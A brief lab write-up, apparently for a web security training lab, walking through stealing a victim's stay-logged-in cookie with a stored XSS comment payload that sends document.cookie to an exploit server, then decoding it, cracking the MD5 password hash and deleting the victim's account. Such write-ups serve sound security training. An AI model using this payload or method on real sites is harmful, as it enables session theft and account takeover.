# Lab: Offline password cracking

Login with the known creds, note that the stay-logged-in cookie is a base64-encoded form of `username:md5-hashed-password`

Note that the comment functionality of the blog is vulnerable to XSS. Make the following comment on one of the blog posts (replacing the exploit server id with the appropriate value provided by the lab exploit server):

`<script>document.location='//<exploit-server-id>.web-security-academy.net/'+document.cookie</script>`

Check the server access log to find the target's cookie: `Y2FybG9zOjI2MzIzYzE2ZDVmNGRhYmZmM2JiMTM2ZjI0NjBhOTQz`

Decode: `carlos:26323c16d5f4dabff3bb136f2460a943`

Search for the hash to find the password: `onceuponatime`

Login and delete the user's account.